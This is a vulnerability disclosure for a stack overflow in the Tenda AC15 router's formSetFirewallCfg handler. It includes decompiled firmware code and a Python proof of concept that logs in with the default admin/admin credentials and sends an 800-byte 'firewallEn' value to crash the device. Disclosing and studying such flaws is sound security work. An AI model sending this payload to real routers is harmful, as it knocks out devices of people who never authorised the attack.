## Tenda AC15 stack overflow vulnerability

### * Version

V15.03.05.19 (US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin)

### * Firmware
[https://www.tenda.com.cn/download/detail-2680.html](https://www.tenda.com.cn/download/detail-2680.html)




### * Vulnerability Detail

In function formSetFirewallCfg, the content obtained by the program from the parameter "firewallEn" is passed to local_20, 
and then the local_20 is directly copied into the local_38 stack through the strcpy function.
There is no size check, so there is a stack overflow vulnerability. The attacker can easily perform a Deny of Service Attack or Remote Code Execution with carefully crafted overflow data.


```c
void formSetFirewallCfg(undefined4 param_1)
{
  ...
  local_20 = (char *)FUN_0002ba8c(param_1,"firewallEn",&DAT_000f2e68);
  __src = (char *)strlen(local_20);
  if ((char *)0x3 < __src) {
    strcpy((char *)&local_38,local_20); // here is overflow
    GetValue("security.ddos.map",acStack120);
    GetValue("firewall.pingwan",&local_80);
    sprintf(acStack256,"%c,1500;%c,1500;%c,1500",local_38 & 0xff,local_38 >> 0x10 & 0xff,
            local_38 >> 8 & 0xff);
    SetValue("security.ddos.map",acStack256);
    SetValue("firewall.pingwan",(int)&local_38 + 3);
    memset(acStack256,(int)&DAT_000f2e9c,0x40);
 ...
}
```

### * POC
```python
import requests


cmd  = b'firewallEn=' + b'A' * 800



url = b"http://192.168.2.2/login/Auth"
payload = b"http://192.168.2.2/goform/SetFirewallCfg?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()


```
